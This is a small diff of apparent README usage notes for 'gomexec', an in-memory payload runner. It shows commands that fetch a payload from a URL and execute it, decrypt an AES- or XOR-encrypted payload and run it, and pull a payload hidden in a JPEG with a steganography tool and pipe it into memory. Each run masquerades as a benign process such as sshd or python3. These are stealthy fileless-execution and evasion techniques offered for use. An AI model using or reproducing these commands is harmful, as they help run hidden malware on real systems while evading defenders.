@@ -39,7 +39,8 @@ URL=https://example.com/payload NAME=/usr/bin/python3 gomexec
 # encrypted payload (32-byte key = AES-256-GCM, anything else = XOR)
 cat payload.enc | KEY=<64-hex-chars> gomexec
 
-# chain with nightcloak
+# chain with nightcloak (https://github.com/NumeXx/nightcloak)
+# extract a hidden payload from a carrier file, pipe straight into memory
 nightcloak reveal carrier.jpg -p pass | NAME=sshd gomexec
 
 # chain with gsocket
